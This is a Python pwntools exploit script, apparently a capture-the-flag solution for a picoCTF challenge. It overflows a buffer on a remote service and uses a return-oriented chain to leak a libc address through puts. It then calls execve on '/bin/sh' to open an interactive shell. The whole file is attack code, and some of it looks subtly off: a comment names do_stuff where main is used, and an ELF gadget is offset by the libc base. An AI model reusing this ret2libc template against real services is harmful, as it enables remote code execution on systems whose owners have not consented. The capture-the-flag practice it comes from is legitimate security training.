from pwn import *

context.arch = "amd64"

#_________ALL THE FILES WE NEED__________

elf = ELF("./vuln")
rop_elf = ROP(elf)
libc = ELF("libc.so.6")
rop_libc = ROP(libc)
#________________________________________



#________CONNECTION WITH SERVER___________

host, port = "mercury.picoctf.net" , 49464
p = remote(host, port)

#_________________________________________



#_______ADDRESSES NEED FOR FIRST PAYLOAD________________

padding = "A" * 136                                                 #padding found by overflowing the eip return address
pop_rdi = rop_elf.find_gadget(["pop rdi", "ret"]).address               #gadget rdi
pop_rsi = rop_elf.find_gadget(["pop rsi", "pop r15", "ret"]).address    #gadget rsi
#pop_rdx = rop.find_gadget(["pop rdx"]).address

puts_got = elf.got["puts"]  #the address of the puts function in GOT table
puts_plt = elf.plt["puts"]  #the address of the puts function in PLT table
main = elf.sym["main"]      #the address of the first instruction in main
do_stuff = elf.sym["do_stuff"]      #the address of the do_stuff function(to call it back again)
#_______________________________________________________





#__________________SENDING PAYLOAD__________________________

print(p.recvline())         #recieves the line that asks for the input
payload = padding.encode()  #add the padding to overflow the buffer
payload += p64(pop_rdi)     #pop rdi
payload += p64(puts_got)    #address of puts in the GOT Table
payload += p64(puts_plt)    #address of puts in the PLT table
payload += p64(main)    #return to do_stuff function to execute it again

p.sendline(payload)
print(p.recvline())

#___________________________________________________________




#______________ADDRESS NEEDED FOR THE SECOND PAYLOAD_______________

#leak = p.recvline().rstrip()                      #retrived the address of the puts leak
#puts_libc = u64(leak + (8-len(leak)) * "\x00")    #unpack the address in under a length of 8 bytes

leak = p.recv(6)+b'\x00\x00'
leak = u64(leak) 
print(leak)

offset = libc.symbols["puts"]
libc.address = leak - offset
binsh= next(libc.search(b'/bin/sh\x00'))
system= libc.symbols['system']
nullptr= next(libc.search(b'\x00'*8))
execve = libc.symbols['execve']

#__________________________________________________________________




#___________________SENDING SECOND PAYLOAD________________________

payload  = padding.encode()
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.address + pop_rsi)
payload += p64(nullptr)
#payload += p64(libc.address + pop_rdx)
payload += p64(nullptr)
payload += p64(execve)

p.sendline(payload)
#_________________________________________________________________


p.interactive()